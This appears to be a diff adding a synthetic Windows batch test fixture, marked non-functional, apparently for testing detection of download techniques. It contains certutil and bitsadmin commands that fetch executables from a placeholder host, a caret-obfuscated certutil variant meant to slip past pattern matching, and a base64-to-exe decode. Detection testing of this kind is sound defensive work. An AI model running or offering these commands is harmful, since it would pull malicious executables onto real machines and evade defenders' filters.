@@ -1,0 +1,6 @@
+@echo off
+rem SYNTHETIC TEST FIXTURE — not functional
+{{CERTUTIL}} -urlcache -f https://payload.example.invalid/a.exe a.exe
+cert^util -url^cache -f https://payload.example.invalid/b.exe b.exe
+{{CERTUTIL}} -decode a.b64 a.exe
+{{BITSADMIN}} /transfer job https://payload.example.invalid/c.exe c.exe
